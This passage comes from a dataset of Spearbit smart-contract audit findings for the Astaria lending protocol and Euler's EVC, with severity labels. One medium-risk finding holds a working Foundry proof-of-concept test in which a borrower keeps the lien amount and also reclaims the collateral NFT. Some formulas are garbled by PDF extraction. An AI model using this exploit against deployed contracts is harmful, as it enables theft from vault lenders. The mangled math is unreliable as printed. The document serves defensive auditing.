WithdrawProxy before calling epochProcess().  Wn+1 | the current epoch's WithdrawProxy after calling epochProcess(). Also assume that claim() was already called on the previous epoch's WithdrawProxy if needed. After the call to epochProcess() (in the same block), we would have roughly (not considering the division errors) A0 = y 0 0 + s(t (cid:0) tp) A0 = (1 (cid:0) SW S )A + X s2U1 (a(s, t) (cid:0) a(s, tp)) wr = ( SW S ) B + a(s, tp) X s2U1 A = A0 + wr + ( SW S ) X (s,tl )2U2 a(s, tl ) (cid:0)(cid:1)A = wr + ( SW S )E and so: To be able to call processEpoch() again we need to make sure wr tokens have been transferred to Wn either from the public vault's assets B or from Wn+1 assets. Note that at this point wr equals to wr = SW S B + SW S X s2U1 a(s, tp) SW S B is an actual asset and can be transferred to Wn right away. The The a(s, tp) portion is a percentage of the amount owed by active liens at the time the processEpoch() was called. Depending on whether these liens get paid fully or not we would have: SW S Ps2U1  If they get fully paid there are no risks for the future shareholders to bare.  If these liens are not fully paid since we have transferred a(s, tp) from the actual asset balance to Wn the redeeming shareholder would not take the risk of these liens getting liquidated for less than their value. But these risks are transferred to the upcoming shareholders or the shareholders who have not redeemed their positions yet. SW S Ps2U1", "labels": ["Spearbit", "Astaria", "Severity: Medium Risk"]}, {"title": "validateOrder(...) does not check the consideration amount against its token balance", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "When a lien position gets liquidated the CollateralToken creates a full restricted Seaport auction with itself as both the offerer and the zone. This will cause Seaport to do a callback to the CollateralToken's validateOrder(...) endpoint at the end of order fulfilment/matching. In this endpoint we have: uint256 payment = zoneParameters.consideration[0].amount; This payment amount is not validated.", "labels": ["Spearbit", "Astaria", "Severity: Medium Risk"]}, {"title": "If the auction window is 0, the borrower can keep the lien amount and also take back its collater- alised NFT token", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "If an authorised entity would file to set the auctionWindow to 0, borrowers can keep their lien amount and also take back their collateralised NFT tokens. Below is how this type of vulnerability works. 1. A borrower takes a lien from a vault by collateralising its NFT token. 2. Borrower let the time pass so that its lien/stack position can be liquidated. 3. The borrower atomically liquidates and then calls the liquidatorNFTClaim(...) endpoint of the Collater- alToken. The timestamps are as follows: s (cid:20) t lien t lien e = t auction s = t auction e We should note that in step 3 above when the borrower liquidates its own position, the CollateralToken creates a Seaport auction by calling its validate(...) endpoint. But this endpoint does not validate the orders timestamps so even though the timestamps provided are not valid when one tries to fulfil/match the order since Seaport requires that t auction . Thus, in . So it is not possible to fulfil/match an order where t auction (cid:20) tnow < t auction = t auction e e s s 37 step 3 it is not needed to call liquidatorNFTClaim(...) immediately as the auction created cannot be fulfilled by anyone. // add the following test case to // file: src/test/LienTokenSettlementScenarioTest.t.sol function _createUser(uint256 pk, string memory label) internal returns(address addr) { uint256 ownerPK = uint256(pk); addr = vm.addr(ownerPK); vm.label(addr, label); } function testScenario14() public { // allow flash liens - liens that can be liquidated in the same block that was committed IAstariaRouter.File[] memory files = new IAstariaRouter.File[](1); files[0] = IAstariaRouter.File( IAstariaRouter.FileType.AuctionWindow, abi.encode(uint256(0)) ); ASTARIA_ROUTER.fileBatch(files); console2.log(\"[+] set auction window to 0.\"); { } { address borrower1 = _createUser(0xb055033501, \"borrower1\"); address vaultOwner = _createUser(0xa77ac3, \"vaultOwner\"); address publicVault = _createPublicVault(vaultOwner, vaultOwner, 14 days); vm.label(publicVault, \"publicVault\"); console2.log(\"[+] public vault is created: %s\", publicVault); console2.log(\"vault start: %s\", IPublicVault(publicVault).START()); skip(14 days); _lendToVault( Lender({addr: vaultOwner, amountToLend: 10 ether}), payable(publicVault) ); TestNFT nft1 = new TestNFT(1); address tokenContract1 = address(nft1); uint256 tokenId1 = uint256(0); nft1.transferFrom(address(this), borrower1, tokenId1); vm.startPrank(borrower1); (uint256 lienId,ILienToken.Stack memory stack) = _commitToLien({ vault: payable(publicVault), strategist: vaultOwner, strategistPK: 0xa77ac3, tokenContract: tokenContract1, tokenId: tokenId1, lienDetails: ILienToken.Details({ maxAmount: 2 ether, rate: 1e8, duration: 1 hours, maxPotentialDebt: 0 ether, liquidationInitialAsk: 10 ether }), amount: 2 ether, 38 revertMessage: \"\" }); console2.log(\"ETH balance of the borrower: %s\", borrower1.balance); skip(1 hours); console2.log(\"[+] lien created with 0 duration. lineId: %s\", lienId); OrderParameters memory params = _liquidate(stack); console2.log(\"[+] lien liquidated by the borrower.\"); COLLATERAL_TOKEN.liquidatorNFTClaim( stack, params, COLLATERAL_TOKEN.SEAPORT().getCounter(address(COLLATERAL_TOKEN)) ); console2.log(\"[+] liquidator/borrower claimed NFT.\\n\"); vm.stopPrank(); console2.log(\"owner of the NFT token: %s\", nft1.ownerOf(tokenId1)); console2.log(\"ETH balance of the borrower: %s\", borrower1.balance); assertEq( nft1.ownerOf(tokenId1), borrower1, \"the borrower should own the NFT\" ); assertEq( borrower1.balance, 2 ether, \"borrower should still have the lien amount.\" ); } } forge t --mt testScenario14 --ffi -vvv: [+] set auction window to 0. [+] public vault is created: 0x4430c0731d87768Bf65c60340D800bb4B039e2C4 vault start: 1 ETH balance of the borrower: 2000000000000000000 [+] lien created with 0 duration. lineId: ,! [+] lien liquidated by the borrower. [+] liquidator/borrower claimed NFT. 91310819262208864484407122336131134788367087956387872647527849353935417268035 owner of the NFT token: 0xA92D072d39E6e0a584a6070a6dE8D88dfDBae2C7 ETH balance of the borrower: 2000000000000000000", "labels": ["Spearbit", "Astaria", "Severity: Medium Risk"]}, {"title": "An owner might not be able to cancel all signed liens by calling incrementNonce()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "If the vault owner or the delegate is phished into signing terms with consecutive nonces in a big range, they would not be able to cancel all those terms with the current incrementNonce() implementation as this value is only incrementing the nonce one at a time. As an example Seaport increments their counters using the following formula n += blockhash(block.number - 1) << 0x80;", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "Error handling for USDT transactions in TransferProxy", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "To handle edge cases where the receiver is blacklisted, TransferProxy.tokenTransferFromWithErrorReceiver(...) is designed to catch errors that may occur during the first transfer attempt and then proceed to send the tokens to the error receiver. try ERC20(token).transferFrom(from, to, amount) {} catch { _transferToErrorReceiver(token, from, to, amount); } However, it's worth noting that this approach may not be compatible with non-standard ERC20 tokens (e.g., USDT) that do not return any value after a transferFrom operation. The try-catch pattern in Solidity can only catch errors resulting from reverted external contract calls, but it does not handle errors caused by inconsistent return values. Consequently, when using USDT, the entire transaction will revert.", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "PublicVault does not handle funds in errorReceiver", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "involves PROXY.tokenTransferFromWithErrorReceiver. The implementation in the TransferProxy contract involves sending the tokens to an error receiver that is con- trolled by the original receiver. However, this approach can lead to accounting errors in the PublicVault as PublicVault does not pull tokens from the error receiver. process transferProxy.TRANSFER_- LienToken.MakePayment(...), function from the in the tokens using user the to function tokenTransferFromWithErrorReceiver( // ... ) { try ERC20(token).transferFrom(from, to, amount) {} catch { _transferToErrorReceiver(token, from, to, amount); } } Note that, in practice, tokens would not be transferred to the error receiver. The issue is hence considered to be a low-risk issue.", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "Inconsistent Vault Fee Charging during Loan Liquidation via WithdrawProxy", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "In the smart contract code of PublicVault, there is an inconsistency related to the charging of fees when a loan is liquidated at epoch's roll and the lien is sent to WithdrawProxy. The PublicVault.owner is supposed to take a ratio of the interest paid as the strategist's reward, and the fee should be charged when a payment is made in the function PublicVault.updateVault(...), regardless of whether it's a normal payment or a liquidation payment. It appears that the fee is not being charged when a loan is liquidated at epoch's roll and the lien is sent to With- drawProxy. This discrepancy could potentially lead to an inconsistent distribution of fees and rewards.", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "VaultImplementation.init(...) silently initialised when the allowlist parameters are not throughly validated", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "In VaultImplementation.init(...), if params.allowListEnabled is false but params.allowList is not empty, s.allowList does not get populated.", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "Several functions in AstariaRouter can be made non-payable", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "Following functions in AstariaRouter are payable when they should never be sent the native token: mint(), deposit(), withdraw(), redeem(), pullToken()", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "Loan duration can be reduced at the time of borrowing without user permission", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "Requested loan duration, if greater than the maximum allowed duration (the time to next epoch's end), is set to this maximum value: if (timeToSecondEpochEnd < lien.details.duration) { lien.details.duration = timeToSecondEpochEnd; } This happens without explicit user permission.", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "Native tokens sent to DepositHelper can get locked", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "DepositHelper has the following two endpoints: fallback() external payable {} receive() external payable {} If one calls this contract by not supplying the deposit(...) function signature, the msg.value provided would get locked in this contract.", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "Updated ...EpochLength values are not validated", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "Sanity check is missing for updated s.minEpochLength and s.maxEpochLength. Need to make sure s.minEpochLength <= s.maxEpochLength", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "CollateralToken's conduit would have an open channel to an old Seaport when Seaport is updated", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "After filing for a new Seaport the old Seaport would still have an open channel to it from the Col- lateralToken's conduit (assuming the old and new Seaport share the same conduit controller).", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "CollateralToken's tokenURI uses the underlying assets's tokenURI", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "Since the CollateralToken positions can be sold on secondary markets like OpenSea, the tokenURI endpoint should be customised to avoid misleading users and it should contain information relating to the Collat- eralToken and not just its underlying asset. It would also be great to pull information from its associated lien to include here.  What-is-OpenSea-s-copymint-policy.  docs.opensea.io/docs/metadata-standards.  Necromint got banned on OpenSea.", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "Filing to update one of the main contract for another main contract lacks validation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "The main contracts AstariaRouter, CollateralToken, and LienToken all need to be aware of each other and form a connected triangle. They are all part of a single unit and perhaps are separated into 3 different contract due to code size and needing to have two individual ERC721 tokens. Their authorised filing structure is as follows:  Note that one cannot file for CollateralToken to change LienToken as the value of LienToken is only set during the CollateralToken's initialisation. If one files to change one of these nodes and forget to check or update the links between these contract, the triangle above would be broken.", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "TRANSFER_PROXY is not queried in a consistent fashion.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "Different usages of TRANSFER_PROXY and how it is queried  AstariaRouter: Used in pullToken(...) to move tokens from the msg.sender to a another address.  CollateralToken: Used in validateOrder(...) where Seaport has callbacked into. Here Collateral- Token gives approval to TRANSFER_PROXY which is queried from AstariaRouter for the settlement tokens. TRANSFER_PROXY is also used to transfer tokens. 47  LienToken: In _payment(...) TRANSFER_PROXY is used to transfer tokens from CollateralToken to the lien owner. This implies that the TRANSFER_PROXY used in CollateralToken should be the same that is used in LienToken. Therefore, from the above we see that: 1. TRANSFER_PROXY holds tokens approvals for ERC20 or wETH tokens used as lien tokens. 2. TRANSFER_PROXY's address should be the same at all call sites for the different contract AstariaRouter, CollateralToken and LienToken. 3. Except CollateralToken which queries TRANSFER_PROXY from AstariaRouter, the other two contract As- tariaRouter and LienToken read this value from their storage. Note that the deployment script sets assigns the same TRANSFER_PROXY to all the 3 main contracts in the codebase AstariaRouter, CollateralToken, and LienToken.", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "Multicall when inherited to ERC4626RouterBase does not bubble up the reverts correctly", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "Multicall does not bubble up the reverts correctly. The current implementation uses the following snippet to bubble up the reverts // https://github.com/AstariaXYZ/astaria-gpl/blob/.../src/Multicall.sol pragma solidity >=0.7.6; if (!success) { // Next 5 lines from https://ethereum.stackexchange.com/a/83577 if (result.length < 68) revert(); assembly { result := add(result, 0x04) } revert(abi.decode(result, (string))); } 48 // https://github.com/AstariaXYZ/astaria-gpl/blob/.../src/ERC4626RouterBase.sol pragma solidity ^0.8.17; ... abstract contract ERC4626RouterBase is IERC4626RouterBase, Multicall { ... } This method of bubbling up does not work with new types of errors:  Panic(uint256) 0.8.0 (2020-12-16)  Custom errors introduced in 0.8.4 (2021-04-21)  ...", "labels": ["Spearbit", "Astaria", "Severity: Low Risk"]}, {"title": "Cache VAULT().ROUTER().LIEN_TOKEN()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "leads to extra external calls.", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "s.currentEpoch can be cached in processEpoch()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "s.currentEpoch is being read from the storage multiple times in the processEpoch().", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "Use basis points for ratios", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "Fee ratios are represented through two state variables for numerator and denominator. Basis point system can be used in its place as it is simpler (denominator always set to 10_000), and gas efficient as denomi- nator is now a constant.", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "liquidatorNFTClaim()'s arguments can be made calldata", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "The following arguments can be converted to calldata to save gas on copying them to memory: function liquidatorNFTClaim( ILienToken.Stack memory stack, OrderParameters memory params, uint256 counterAtLiquidation ) external whenNotPaused {", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "a.mulDivDown(b,1) is equivalent to a*b", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "Highlighted code below the pattern of a.mulDivDown(b, 1) which is equivalent to a*b except the revert parameters in case of an overflow return uint256(s.slope).mulDivDown(delta_t, 1) + uint256(s.yIntercept);", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "try/catch can be removed for simplicity", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "The following code catches a revert in the external call WETH.deposit{value: owning}() and then reverts itself in the catch clause try WETH.deposit{value: owing}() { WETH.approve(transferProxy, owing); // make payment lienToken.makePayment(stack); // check balance if (address(this).balance > 0) { // withdraw payable(msg.sender).transfer(address(this).balance); } } catch { revert(); } This effect can also be achieved without using try/catch which simplifies the code too.", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "Cache s.idToUnderlying[collateralId].auctionHash", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "In liquidatorNFTClaim(...), s.idToUnderlying[collateralId].auctionHash is read twice from the storage.", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "Cache keccak256(abi.encode(stack))", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "In LienToken._handleLiquidation(...) lienId is calculated as uint256 lienId = uint256(keccak256(abi.encode(stack))); Note that _handleLiquidation(...) is called by handleLiquidation(...) which has a modifier validateCol- lateralState(...): validateCollateralState( stack.lien.collateralId, keccak256(abi.encode(stack)) ) And thus keccak256(abi.encode(stack)) is performed twice. The same multiple hashing calculation also hap- pens in makePayment(...) flow. to cache the keccak256(abi.encode(stack)) value for the above", "labels": ["Spearbit", "Astaria", "Severity: Gas Optimization"]}, {"title": "Functions can be made view or pure", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "Several functions can be view or pure. Compiler also warns about these functions. For instance, _validateRequest() can be made view. getSeaportMetadata() can be made pure instead of view.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Fix compiler generated warnings for unused arguments", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "Several functions have arguments which are not used and compiler generates a warning for each instance, cluttering the output. This makes it easy to miss useful warnings. Here is one example of a function with unused arguments: function deposit( uint256 assets, address receiver ) { } public virtual override(ERC4626Cloned, IERC4626) onlyVault returns (uint256 shares) revert NotSupported();", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Non-lien NFT tokens can get locked in the vaults", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "Both public and private vault when their onERC721Received(...) is called they return the IERC721Receiver.onERC721Received.selector and perform extra logic if the msg.sender is the LienToken and the operator is the AstariaRouter. This means other NFT tokens (other than lien tokens) received by a vault will be locked.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Validation checks should be performed at the beginning of processEpoch()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "The following validation check for the data corresponding to the current epoch happens in the middle of processEpoch() where there have already been some accounting done: if (s.epochData[s.currentEpoch].liensOpenForEpoch > 0) { revert InvalidVaultState( InvalidVaultStates.LIENS_OPEN_FOR_EPOCH_NOT_ZERO ); }", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Define and onlyOwner modifier for VaultImplementation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "The following require statement has been used multiple times require(msg.sender == owner());", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Vault is missing an interface", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "Vault is missing an interface", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "RepaymentHelper.makePayment(...) transfer is used", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "In RepaymentHelper.makePayment(...) the transfer function is used to return extra native tokens sent to this contract. The use of transfer which restrict the amount of gas shared with the msg.sender is not required, since there are no actions after this call site, it is safe to call the msg.sender directly to transfer these funds.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Consider importing Uniswap libraries directly", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "astaria-gpl copies the libraries highlighted above which were written originally in Solidity v0.7 and refactors them to v0.8. Uniswap has also provided these contracts for Solidity v0.8 in branches named 0.8. See v3-core@0.8 and v3-periphery@0.8. Using these files directly reduces the amount of code owned by Astaria.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Elements' orders are not consistent in solidity files", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "Elements' orders are not consistent in solidity files", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "FileType definitions are not consistent", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "Both ICollateralToken.FileType and ILienToken.FileType start their enums with NotSupported. The definition of FileType in IAstariaRouter is not consistent with that pattern. This might be due to having 0 as a NotSupported so that the file endpoints would revert.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "VIData.allowlist can transfer shares to entities not on the allowlist", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "allowList is only used to restrict the share recipients upon mint or deposit to a vault if allowLis- tEnabled is set to true. These shareholders can later transfer their share to other users who might not be on the allowList.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Extract common struct fields from IStrategyValidator implementations", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "All the IStrategyValidator implementations have the following data encoded in the NewLienRe- quest.nlrDetails struct CommonData { uint8 version; address token; // LP token for Uni_V3... address borrower; ILienToken.Details lienDetails; bytes moreData; // depends on each implementation }", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "_createLien() takes in an extra argument", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "_createLien(LienStorage storage s, ...) doesn't use s and hence can be removed as an argument.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "unchecked has no effect", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "unchecked only affects the arithmetic operations directly nested under it. In this case unchecked is unnecessary: unchecked { s.yIntercept = (_totalAssets(s)); s.last = block.timestamp.safeCastTo40(); }", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Multicall can reuse msg.value", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "A delegatecall forwards the same value for msg.value as found in the current context. Hence, all delegatecalls in a loop use the same value for msg.value. In the case of these calls using msg.value, it has the ability to use the native token balance of the contract itself for (uint256 i = 0; i < data.length; i++) { (bool success, bytes memory result) = address(this).delegatecall(data[i]); ... }", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Authorised entities can drain user assets", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "An authorized entity can steal user approved tokens (vault assets and vault tokens, ...) using these endpoints 58 function tokenTransferFrom( address token, address from, address to, uint256 amount ) external requiresAuth { ERC20(token).safeTransferFrom(from, to, amount); } function tokenTransferFromWithErrorReceiver( address token, address from, address to, uint256 amount ) external requiresAuth { try ERC20(token).transferFrom(from, to, amount) {} catch { _transferToErrorReceiver(token, from, to, amount); } } Same risk applies to all the other upgradable contracts.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Conditional statement in _validateSignature(...) can be simplified/optimized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "When validating the vault strategist's (or delegate's) signature for the commitment, we perform the following check if ( (recovered != strategist && recovered != delegate) || recovered == address(0) ) { revert IVaultImplementation.InvalidRequest( IVaultImplementation.InvalidRequestReason.INVALID_SIGNATURE ); } The conditional statement: (recovered != strategist && recovered != delegate) 59 perhaps can be optimised/simplified.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "AstariaRouter cannot deposit into private vaults", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "The allowlist for private vaults only includes the private vault's owner function newVault( address delegate, address underlying ) external whenNotPaused returns (address) { address[] memory allowList = new address[](1); allowList[0] = msg.sender; RouterStorage storage s = _loadRouterSlot(); ... } Note that for private vaults we cannot modify or disable/enable the allowlist. includes the owner. It is always enabled and only That means only the owner can deposit into the private vault function deposit( uint256 amount, address receiver ) public virtual whenNotPaused returns (uint256) { VIData storage s = _loadVISlot(); require(s.allowList[msg.sender] && receiver == owner()); ... } If we the owner would like to be able to use the AstariaRouter's interface by calling its deposit(...), or de- positToVault(...) endpoint (which uses the pulling strategy from transfer proxy), it would not be able to. Anyone can directly transfer tokens to this private vault by calling asset() directly. So above requirement re- quire(s.allowList[msg.sender] ... ) seems to also be there to avoid potential mistakes when one is calling the ERC4626RouterBase.deposit(...) endpoint to deposit into the vault indirectly using the router.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Reorganise sanity/validity checks in the commitToLien(...) flow", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "The following checks are preformed in _validateRequest(...):  params.lienRequest.amount == 0: if (params.lienRequest.amount == 0) { revert ILienToken.InvalidLienState( ILienToken.InvalidLienStates.AMOUNT_ZERO ); } The above check can be moved to the very beginning of the commitToLien(...) flow. Perhaps right before or after we check the commitment's vault provided is valid.  newStack.lien.details.duration < s.minLoanDuration can be checked right after we compare to time to the second epoch end: if (publicVault.supportsInterface(type(IPublicVault).interfaceId)) { uint256 timeToSecondEpochEnd = publicVault.timeToSecondEpochEnd(); require(timeToSecondEpochEnd > 0, \"already two epochs ahead\"); if (timeToSecondEpochEnd < lien.details.duration) { lien.details.duration = timeToSecondEpochEnd; } } if (lien.details.duration < s.minLoanDuration) { revert ILienToken.InvalidLienState( ILienToken.InvalidLienStates.MIN_DURATION_NOT_MET ); } This only works if we assume the LienToken.createLien(...) endpoint does not change the duration. The current implementation does not.  block.timestamp > params.lienRequest.strategy.deadline can also be checked at the very beginning of the commitToLien flow.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Refactor fetching strategyValidator", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "Both _validateCommitment(...) and getStrategyValidator(...) need to fetch strategyVal- idator and both use the same logic.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "The stack provided as an extra data to settle Seaport auctions need to be retrievable", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "The stack provided as an extra data to settle Seaport auctions need to be retrievable. Perhaps one can figure this from various events or off-chain agents, but it is not directly retrievable.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Make sure CollateralToken is connected to Seaport v1.5", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf", "body": "Currently the CollateralToken proxy (v0) is connected to Seaport v1.1 which has different call- backs to the zone and it also only performs static calls. If the current version of CollateralToken gets connected to the Seaport v1.1, no one would be able to settle auctions created by the CollateralToken. This is due to the fact that the callbacks would revert.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "isSignerValid cannot be considered future-proof", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVC-April-2024.pdf", "body": "The isSignerValid function is used by the permit function to validate if the signer can be consid- ered a safe and valid signer. From the Natspec documentation and the inline comments, we can assume that:  The function will be overridden with a custom logic given the chain on which the EthereumVaultConnector contract will be deployed to.  If the signer and precompiles or predeployes share the same owner (fall into the same 19 bytes address prefix), the signer should be considered invalid. The list of precompiles for a chain is not a static and fixed list and could change when a chain is upgraded. Because of this, the logic on which the isSignerValid is based on could end up not covering all the cases it should. This becomes a problem given that the EthereumVaultConnector is not an upgradable contract.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "Docs: Consider documenting explicitly that the number of collateral per account is restricted to an upper bound of 10", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVC-April-2024.pdf", "body": "The accountCollaterals is a mapping state variable that maps and address to a SetStorage type. The SetStorage type can be seen as a \"custom\" array that at max can contain 10 elements. Having the numbers of collateral enabled limited to a maximum number of 10 should be well documented inside the contract, interface and documentation because it could limit and influence the user's experience in certain scenarios. Let's assume that Alice has enabled 10 collaterals and Alice has performed a borrow on controllerVault with the max possible LTV possible. Note that the controllerVault has its own logic and collateral whitelist, so it could decide to only recognize 1 of those collaterals and discard the rest (value of the discarded collaterals is 0 inside the HF). Let's now assume that Alice becomes liquidable. Alice has 3 options: 1) Add a new collateral recognized by controllerVault (if not recognized, controller- Vault.checkAccountStatus would revert). 2) Repay enough debt. 3) Supply enough collateral to the existing collaterals already recognized by controllerVault (if not recog- nized, controller.checkAccountStatus would revert). Let's say that Alice is unable to perform action 2 and 3 because she can't repay the debt, or she can't supply existing collateral tokens. The only possible option in such scenarios is to: 1) Perform EVC.disableCollateral for an existing collateral (preferably one that is not recognized by con- trollerVault). 4 2) Perform EVC.enableCollateral for a new collateral that is recognized by controllerVault. Note that this operation can only be done inside an EVC.batch call, otherwise the disableCollateral operation would revert because Alice is already liquidable and would not be allowed to remove a collateral (it would trigger a non-deferred account-status-check). There are additional edge-case scenarios that could create difficulties for the end user when he/she has enabled the max number of collaterals, and the limitations (of 10 collaterals) should be well documented.", "labels": ["Spearbit", "Euler", "Severity: Informational"]}, {"title": "The setAccountOwnerInternal is redundant", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVC-April-2024.pdf", "body": "The setAccountOwnerInternal is redundant as is only used in the authenticateCaller function.", "labels": 